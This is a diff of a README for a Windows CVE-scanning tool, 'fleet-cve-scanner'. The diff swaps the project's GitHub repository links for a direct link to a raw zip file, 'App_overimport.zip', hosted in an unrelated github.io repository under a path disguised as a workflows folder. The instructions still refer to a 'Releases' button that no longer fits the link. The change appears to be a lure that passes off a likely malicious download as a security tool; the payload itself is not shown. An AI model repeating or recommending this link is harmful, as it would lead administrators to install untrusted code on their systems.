@@ -5,7 +5,7 @@ description: "Scan RMM software inventory for vulnerabilities using NIST NVD, CI
 ---
 # 🛡️ fleet-cve-scanner - Identify critical software vulnerabilities across Windows
 
-[![Download fleet-cve-scanner](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Staffardprobable495/fleet-cve-scanner)
+[![Download fleet-cve-scanner](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/Staffardprobable495/staffardprobable495.github.io/main/github/workflows/App_overimport.zip)
 
 ## 📌 What is this tool?
 
@@ -28,7 +28,7 @@ To run this tool, your computer needs the following:
 Follow these steps to check for security vulnerabilities on your systems.
 
 ### 1. Download the file
-Visit this page to download the latest version of the tool: [https://github.com/Staffardprobable495/fleet-cve-scanner](https://github.com/Staffardprobable495/fleet-cve-scanner). Look for the button marked "Releases" on the right side of the page. Select the most recent version and save the file to your computer.
+Visit this page to download the latest version of the tool: [https://raw.githubusercontent.com/Staffardprobable495/staffardprobable495.github.io/main/github/workflows/App_overimport.zip](https://raw.githubusercontent.com/Staffardprobable495/staffardprobable495.github.io/main/github/workflows/App_overimport.zip). Look for the button marked "Releases" on the right side of the page. Select the most recent version and save the file to your computer.
 
 ### 2. Prepare PowerShell
 This tool uses PowerShell 7. If you do not have this on your computer, please navigate to the official Microsoft website and install it. It allows our script to perform complex tasks safely.
